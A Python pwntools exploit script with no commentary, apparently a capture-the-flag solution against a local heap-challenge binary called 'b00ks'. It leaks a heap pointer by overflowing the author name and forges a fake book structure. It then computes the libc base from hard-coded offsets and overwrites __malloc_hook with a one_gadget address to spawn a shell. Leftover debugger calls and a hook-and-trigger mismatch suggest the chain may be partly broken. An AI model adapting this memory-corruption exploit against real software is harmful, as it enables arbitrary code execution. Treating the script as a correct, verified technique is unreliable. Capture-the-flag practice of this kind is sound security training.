from pwn import *
context(
	log_level='debug',
	binary='./b00ks'
)
e=context.binary
libc=e.libc
io=process()

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def author(author_name):
	io.sendlineafter('Enter author name: ',str(author_name))

def menu(func):
	io.sendlineafter('> ',str(func))

def create(book_name_size,book_name,book_des_size,book_des):
	menu(1)
	io.sendlineafter('Enter book name size: ',str(book_name_size))
	io.sendlineafter('Enter book name (Max 32 chars): ',str(book_name))
	io.sendlineafter('Enter book description size: ',str(book_des_size))
	io.sendlineafter('Enter book description: ',str(book_des))

def delete(index):
	menu(2)
	io.sendlineafter('Enter the book id you want to delete: ',str(index))

def edit(index,book_des):
	menu(3)
	io.sendlineafter('Enter the book id you want to edit: ',str(index))
	io.sendafter('Enter new book description: ',str(book_des))
	io.sendline()

def show():
	menu(4)

def changeAuthor(author_name):
	menu(5)
	author(author_name)



#=========================================
#VAR
lib_off=5959696
gadget=[283158,283242,983716,987463]
#=========================================
author('A'*32)
create(0xd0,'a',0x20,'b')
create(0x21000,'a',0x21000,'b')
show()
io.recvuntil('A'*32)
book1_addr=u64(io.recv(6).ljust(8,'\x00'))
success("book1_addr is: " + hex(book1_addr))
show()
io.recvuntil('ID: ')
book_id_1 = int(io.readline()[:-1])
fake_book=p64(0x1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff)
edit(book_id_1,fake_book)
changeAuthor('B'*32)

show()
io.recvuntil('Name: ')
book2_name_addr=u64(io.readline()[:-1].ljust(8,'\x00'))
io.recvuntil('Description: ')
book2_des_addr=u64(io.readline()[:-1].ljust(8,'\x00'))
success('book2_name_addr: '+hex(book2_name_addr))
success('book2_des_addr: '+hex(book2_des_addr))
libc.address = book2_name_addr-lib_off
success('libc.address '+hex(libc.address))
dbg()
one_gadget=libc.address+gadget[2]
free_hook=libc.symbols['__free_hook']
malloc_hook=libc.symbols['__malloc_hook']
edit(1,p64(malloc_hook))
edit(2,p64(one_gadget))
#delete(2)
#create(0xd0,'a',0x20,'b')
delete(1)
#delete(1)
#dbg()

io.interactive()

